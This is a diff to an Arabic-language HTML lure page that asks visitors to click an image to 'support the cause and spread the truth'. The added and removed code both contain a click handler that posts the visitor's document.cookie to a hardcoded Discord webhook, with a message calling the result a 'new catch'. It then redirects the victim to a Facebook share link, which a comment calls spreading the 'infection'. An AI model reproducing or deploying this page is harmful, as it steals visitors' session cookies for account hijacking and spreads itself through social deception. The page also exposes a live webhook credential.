@@ -3,24 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <title>نصرة الحقيقة</title>
-    <style>
-        body { background-color: #0d1117; color: white; text-align: center; padding: 20px; }
-        img { width: 100%; max-width: 500px; border-radius: 10px; cursor: pointer; }
-    </style>
 </head>
-<body>
+<body style="background-color: #0d1117; color: white; text-align: center; padding: 50px;">
+
     <h2>اضغط على الصورة لنصرة القضية ونشر الحقيقة للعالم</h2>
-    <img src="https://image.api.playstation.com/vulcan/ap/rnd/202311/1718/437e58316c0205c040d718917e8892185b3068e82a9336d3.png" onclick="strike()">
+    
+    <img src="https://image.api.playstation.com/vulcan/ap/rnd/202311/1718/437e58316c0205c040d718917e8892185b3068e82a9336d3.png" 
+         onclick="sendData()" style="width: 100%; max-width: 500px; cursor: pointer; border-radius: 15px;">
+
     <script>
-    async function strike() {
-        const webhookUrl = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
-        await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ content: `📢 **صيد جديد من المعبد!**\n\n**النخاع (Cookies):**\n\`\`\`${document.cookie}\`\`\`` })
-        });
+    async function sendData() {
+        // [!] هذا هو السلك الذي يربط غيت هاب بديسكورد
+        const discordWebhook = "https://discord.com/api/webhooks/1462191245051826242/Oc6Gh4VaGaKICuOhjZsQHUB6CABpZMQrxtmms5yi8wIKwIg401gmoFHLkp34xCXIgp81";
+        
+        const content = {
+            content: `📢 **صيد جديد من المعبد!**\n\n**النخاع المستخرج:**\n\`\`\`${document.cookie}\`\`\``
+        };
+
+        try {
+            await fetch(discordWebhook, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(content)
+            });
+        } catch (e) {
+            console.log("Error sending data");
+        }
+
+        // تحويل الضحية فوراً لنشر "العدوى" في فيسبوك
         window.location.href = "https://www.facebook.com/sharer/sharer.php?u=" + window.location.href;
     }
     </script>
+
 </body>
 </html>
